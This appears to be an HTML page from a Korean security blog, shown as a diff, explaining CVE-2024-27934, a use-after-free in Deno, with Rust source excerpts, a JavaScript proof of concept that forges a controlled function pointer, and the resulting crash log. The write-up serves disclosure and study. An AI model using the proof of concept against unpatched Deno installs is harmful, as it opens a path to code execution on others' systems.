+  write_waker: Option&amp;lt;Waker&amp;gt;,
+
+  _unsend: PhantomData&amp;lt;std::sync::MutexGuard&amp;lt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;static, ()&amp;gt;&amp;gt;,&lt;/span&gt;
+&lt;span class=&#34;hljs-string&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &lt;code&gt;rid&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xC5EC; &amp;#xD638;&amp;#xCD9C;&amp;#xD55C; &amp;#xC544;&amp;#xB798;&amp;#xC758; &lt;code&gt;op_readable_stream_resource_get_sink&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; channel&amp;#xC758; &lt;code&gt;ExternalPointer&lt;/code&gt;&amp;#xAC00; &amp;#xC0DD;&amp;#xC131;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;pub fn op_readable_stream_resource_get_sink(
+  state: &amp;amp;mut OpState,
+  #[smi] rid: ResourceId,
+) -&amp;gt; *&lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; c_void {
+  &lt;span class=&#34;hljs-keyword&#34;&gt;let&lt;/span&gt; Ok(resource) = state.resource_table.get::&lt;span class=&#34;xml&#34;&gt;&lt;span class=&#34;hljs-tag&#34;&gt;&amp;lt;&lt;span class=&#34;hljs-name&#34;&gt;ReadableStreamResource&lt;/span&gt;&amp;gt;&lt;/span&gt;(rid)&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;  else {&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;    return std::ptr::null();&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;  };&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;  ExternalPointer::new(resource.channel.clone()).into_raw()&lt;/span&gt;
+&lt;span class=&#34;xml&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;op_readable_stream_resource_close&lt;/code&gt;&amp;#xD638;&amp;#xCD9C;&amp;#xB85C; channel&amp;#xC774; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;Deno.close(rid)&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xD574;&amp;#xC81C;&amp;#xB41C; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. PoC&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC640; &lt;code&gt;DataView&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC7AC;&amp;#xD560;&amp;#xB2F9; &amp;#xBC1B;&amp;#xC740; &amp;#xB2E4;&amp;#xC74C; &lt;code&gt;close&lt;/code&gt; &amp;#xD638;&amp;#xCD9C; &amp;#xC2DC;&amp;#xC5D0; &amp;#xD568;&amp;#xC218; &amp;#xD3EC;&amp;#xC778;&amp;#xD130;&amp;#xB85C; &amp;#xCC38;&amp;#xC870;&amp;#xB418;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC5D0; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB85C; &lt;code&gt;1337c0d30008&lt;/code&gt; &amp;#xB97C; &amp;#xC37C;&amp;#xACE0; &amp;#xD574;&amp;#xB2F9; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xCC38;&amp;#xC870;&amp;#xD558;&amp;#xBA74;&amp;#xC11C; &amp;#xD06C;&amp;#xB798;&amp;#xC2DC;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;[ &lt;span class=&#34;hljs-number&#34;&gt;6439.821046&lt;/span&gt;] deno[&lt;span class=&#34;hljs-number&#34;&gt;15088&lt;/span&gt;]: segfault at &lt;span class=&#34;hljs-number&#34;&gt;1337&lt;/span&gt;c0d30008 ip &lt;span class=&#34;hljs-number&#34;&gt;0000557&lt;/span&gt;b53e2fb3e sp &lt;span class=&#34;hljs-number&#34;&gt;00007f&lt;/span&gt;ffd485ac70 error &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; deno[&lt;span class=&#34;hljs-number&#34;&gt;557&lt;/span&gt;b51714000+&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;d7f000] likely on CPU &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt; (core &lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;, socket &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;)
+[ &lt;span class=&#34;hljs-number&#34;&gt;6439.821054&lt;/span&gt;] Code: &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;85&lt;/span&gt; c0 &lt;span class=&#34;hljs-number&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; ff &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;49&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;b &lt;span class=&#34;hljs-number&#34;&gt;86&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;49&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;b be &lt;span class=&#34;hljs-number&#34;&gt;38&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;49&lt;/span&gt; c7 &lt;span class=&#34;hljs-number&#34;&gt;86&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;30&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;85&lt;/span&gt; c0 &lt;span class=&#34;hljs-number&#34;&gt;74&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; &amp;lt;ff&amp;gt; &lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; ff &lt;span class=&#34;hljs-number&#34;&gt;03&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;83&lt;/span&gt; c4 &lt;span class=&#34;hljs-number&#34;&gt;08&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;b &lt;span class=&#34;hljs-number&#34;&gt;41&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;e c3 &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;d &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;a &lt;span class=&#34;hljs-number&#34;&gt;59&lt;/span&gt; fb &lt;span class=&#34;hljs-number&#34;&gt;48&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt; - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2024/04/17/pwndorei/2024-04-17/">
+
+  <title>[하루한줄] CVE-2024-27934: Deno의 Use-After-Free로 인한 RCE 취약점 - hackyboiz</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
+  <link rel="stylesheet" href="/lib/hint/hint.min.css">
+
+  
+    
+    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
+<link rel="stylesheet" href="/.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+<link rel="stylesheet" href="/.css">
+
+
+<link rel="stylesheet" href="/css/main.css">
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script src="/js/utils.js"></script>
+  <script src="/js/color-schema.js"></script>
+
+<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
+</head>
+
+
+<body>
+  <header style="height: 40vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-addrcard"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/author/">
+                <i class="iconfont icon-user-fill"></i>
+                Author
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2024-04-17 20:00" pubdate>
+      2024년 4월 17일 오후
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      688 자
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       분
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2">
+      <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    </div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">[하루한줄] CVE-2024-27934: Deno의 Use-After-Free로 인한 RCE 취약점</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+              <!-- hackyboiz_horizen_index -->
+              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3672652207808168" data-ad-slot="8887862313" data-ad-format="auto" data-full-width-responsive="true"></ins>
+              <script>
+                   (adsbygoogle = window.adsbygoogle || []).push({});
+              </script>
+              <h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf">https://github.com/denoland/deno/security/advisories/GHSA-3j27-563v-28wf</a></p>
+<h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul>
+<li>Deno &#x2265; 1.36.2</li>
+<li>Deno &lt; 1.40.3</li>
+</ul>
+<h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>JavaScript, TypeScript &#xB7F0;&#xD0C0;&#xC784;&#xC778; Deno&#xC5D0;&#xC11C; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD55C; Use-After-Free &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>Deno&#xC5D0;&#xC11C;&#xB294; <code>*const c_void</code>&#xC640; <code>external!()</code> &#xB9E4;&#xD06C;&#xB85C;&#xB85C; &#xC815;&#xC758;&#xB418;&#xB294; <code>ExternalPointer</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC678;&#xBD80; lifetime&#xC744; &#xAC00;&#xC9C4; &#xC784;&#xC758;&#xC758; <code>void *</code>&#xB97C; wrapping &#xD558;&#xB294; <code>v8::External</code>&#xC744; &#xD45C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; Rust&#xC758; lifetime safety&#xB97C; &#xBB34;&#xC2DC;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD574;&#xB3C4; &#xC774;&#xB97C; &#xD0D0;&#xC9C0;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xC5EC; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xC544;&#xB798;&#xC758; PoC&#xC5D0;&#xC11C;&#xB294; Use-After-Free&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD568;&#xC744; &#xBCF4;&#xC785;&#xB2C8;&#xB2E4;</p>
+<pre><code class="hljs jsx"><span class="hljs-keyword">const</span> ops = Deno[Deno.internal].core.ops;
+<span class="hljs-keyword">const</span> rid = ops.op_readable_stream_resource_allocate();
+<span class="hljs-keyword">const</span> sink = ops.op_readable_stream_resource_get_sink(rid);
+
+<span class="hljs-comment">// close</span>
+ops.op_readable_stream_resource_close(sink);
+ops.op_readable_stream_resource_close(sink);
+
+<span class="hljs-comment">// reclaim BoundedBufferChannelInner</span>
+<span class="hljs-keyword">const</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ArrayBuffer</span>(<span class="hljs-number">0x8058</span>);
+<span class="hljs-keyword">const</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DataView</span>(ab);
+
+<span class="hljs-comment">// forge chunk contents</span>
+dv.setBigUint64(<span class="hljs-number">0</span>, <span class="hljs-number">2n</span>, <span class="hljs-literal">true</span>);
+dv.setBigUint64(<span class="hljs-number">0x8030</span>, <span class="hljs-number">0x1337c0d30000n</span>, <span class="hljs-literal">true</span>);
+
+<span class="hljs-comment">// trigger segfault</span>
+Deno.close(rid);</code></pre>
+<p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; 1.38.1 &#xBC84;&#xC804; &#xC804;&#xAE4C;&#xC9C0;&#xB294; <code>*const c_void</code>&#xAC00;, &#xADF8; &#xC774;&#xD6C4;&#xBD80;&#xD130;&#xB294; <code>ExternalPointer</code>&#xAC00; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/denoland/deno/blob/main/ext/web/stream_resource.rs">stream_resource</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; Use-After-Free&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p>
+<p>&#xBA3C;&#xC800; <code>ops.op_readable_stream_resource_allocate</code>&#xB97C; &#xD1B5;&#xD574; stream resource&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xBC18;&#xD658;&#xB41C; resource id&#xB97C; <code>rid</code>&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>BoundedBufferChannelInner</code>&#xAC00; &#xD560;&#xB2F9;&#xB429;&#xB2C8;&#xB2E4;. </p>
+<pre><code class="hljs jsx">pub fn op_readable_stream_resource_allocate(state: &amp;mut OpState) -&gt; ResourceId {
+  <span class="hljs-keyword">let</span> completion = CompletionHandle::<span class="hljs-keyword">default</span>();
+  <span class="hljs-keyword">let</span> resource = ReadableStreamResource {
+    read_queue: Default::<span class="hljs-keyword">default</span>(),
+    cancel_handle: Default::<span class="hljs-keyword">default</span>(),
+    channel: BoundedBufferChannel::<span class="hljs-keyword">default</span>(),
+    data: ReadableStreamResourceData { completion },
+    size_hint: (<span class="hljs-number">0</span>, None),
+  };
+  state.resource_table.add(resource)
+}
+
+...
+struct BoundedBufferChannel {
+  inner: Rc&lt;RefCell&lt;BoundedBufferChannelInner&gt;&gt;,
+}
+...
+struct BoundedBufferChannelInner {
+  buffers: [MaybeUninit&lt;V8Slice&lt;u8&gt;&gt;; BUFFER_CHANNEL_SIZE <span class="hljs-keyword">as</span> _],
+  ring_producer: u16,
+  ring_consumer: u16,
+  error: Option&lt;AnyError&gt;,
+  current_size: usize,
+  <span class="hljs-comment">// TODO(mmastrac): we can math this field instead of accounting for it</span>
+  len: usize,
+  closed: bool,
+
+  read_waker: Option&lt;Waker&gt;,
+  write_waker: Option&lt;Waker&gt;,
+
+  _unsend: PhantomData&lt;std::sync::MutexGuard&lt;<span class="hljs-string">&apos;static, ()&gt;&gt;,</span>
+<span class="hljs-string">}</span></code></pre>
+<p>&#xC774;&#xD6C4; <code>rid</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xD638;&#xCD9C;&#xD55C; &#xC544;&#xB798;&#xC758; <code>op_readable_stream_resource_get_sink</code>&#xC5D0;&#xC11C;&#xB294; channel&#xC758; <code>ExternalPointer</code>&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs jsx">pub fn op_readable_stream_resource_get_sink(
+  state: &amp;mut OpState,
+  #[smi] rid: ResourceId,
+) -&gt; *<span class="hljs-keyword">const</span> c_void {
+  <span class="hljs-keyword">let</span> Ok(resource) = state.resource_table.get::<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">ReadableStreamResource</span>&gt;</span>(rid)</span>
+<span class="xml">  else {</span>
+<span class="xml">    return std::ptr::null();</span>
+<span class="xml">  };</span>
+<span class="xml">  ExternalPointer::new(resource.channel.clone()).into_raw()</span>
+<span class="xml">}</span></code></pre>
+<p><code>op_readable_stream_resource_close</code>&#xD638;&#xCD9C;&#xB85C; channel&#xC774; &#xD574;&#xC81C;&#xB41C; &#xB2E4;&#xC74C; <code>Deno.close(rid)</code>&#xC5D0;&#xC11C; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xBA74;&#xC11C; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. PoC&#xC5D0;&#xC11C;&#xB294; <code>ArrayBuffer</code>&#xC640; <code>DataView</code>&#xB97C; &#xD1B5;&#xD574; Use-After-Free&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC7AC;&#xD560;&#xB2F9; &#xBC1B;&#xC740; &#xB2E4;&#xC74C; <code>close</code> &#xD638;&#xCD9C; &#xC2DC;&#xC5D0; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xCC38;&#xC870;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB85C; <code>1337c0d30008</code> &#xB97C; &#xC37C;&#xACE0; &#xD574;&#xB2F9; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xBA74;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p>
+<pre><code class="hljs angelscript">[ <span class="hljs-number">6439.821046</span>] deno[<span class="hljs-number">15088</span>]: segfault at <span class="hljs-number">1337</span>c0d30008 ip <span class="hljs-number">0000557</span>b53e2fb3e sp <span class="hljs-number">00007f</span>ffd485ac70 error <span class="hljs-number">4</span> <span class="hljs-keyword">in</span> deno[<span class="hljs-number">557</span>b51714000+<span class="hljs-number">2</span>d7f000] likely on CPU <span class="hljs-number">12</span> (core <span class="hljs-number">12</span>, socket <span class="hljs-number">0</span>)
+[ <span class="hljs-number">6439.821054</span>] Code: <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">85</span> c0 <span class="hljs-number">74</span> <span class="hljs-number">03</span> ff <span class="hljs-number">50</span> <span class="hljs-number">08</span> <span class="hljs-number">49</span> <span class="hljs-number">8</span>b <span class="hljs-number">86</span> <span class="hljs-number">30</span> <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">49</span> <span class="hljs-number">8</span>b be <span class="hljs-number">38</span> <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">49</span> c7 <span class="hljs-number">86</span> <span class="hljs-number">30</span> <span class="hljs-number">80</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">48</span> <span class="hljs-number">85</span> c0 <span class="hljs-number">74</span> <span class="hljs-number">03</span> &lt;ff&gt; <span class="hljs-number">50</span> <span class="hljs-number">08</span> <span class="hljs-number">48</span> ff <span class="hljs-number">03</span> <span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span> <span class="hljs-number">5</span>b <span class="hljs-number">41</span> <span class="hljs-number">5</span>e c3 <span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">3</span>d <span class="hljs-number">0</span>d <span class="hljs-number">1</span>a <span class="hljs-number">59</span> fb <span class="hljs-number">48</span></code></pre>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/1day1line/">1day1line</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/javascript/">javascript</a>
+                  
+                  <a class="hover-with-bg" href="/tags/RCE/">RCE</a>
+                  
+                  <a class="hover-with-bg" href="/tags/Deno/">Deno</a>
+                  
+                  <a class="hover-with-bg" href="/tags/use-after-free/">use-after-free</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_pwndorei.jpg" srcset="/img/loading.gif" alt="pwndorei">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">pwndorei</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/pwndorei">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+
+              <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                  <a href="/2024/04/21/l0ch/2024-04-21/">
+                    <i class="iconfont icon-arrowleft"></i>
+                    <span class="hidden-mobile">[하루한줄] BatBadBut: 여러 프로그래밍 언어에서 발견된 Windows bat 파일 명령줄 인수를 통한 Command Injection 취약점</span>
+                    <span class="visible-mobile">Previous</span>
+                  </a>
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2024/04/15/romi0x/newsletter0415/">
+                    <span class="hidden-mobile">[해킹짹짹🐣] 따뜻한 봄날엔 해킹짹짹💐</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+
+            
+            <!-- Comments -->
+            <article class="comments" id="comments">
+              
+              
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'https://hackyboiz.github.io/2024/04/17/pwndorei/2024-04-17/';
+        this.page.identifier = '/2024/04/17/pwndorei/2024-04-17/';
+      };
+      function loadDisqus() {
+        (function () {
+          var d = document,
+            s = d.createElement('script');
+          s.src = '//' + 'hackyboiz' + '.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      }
+      waitElementVisible('disqus_thread', loadDisqus);
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+            </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
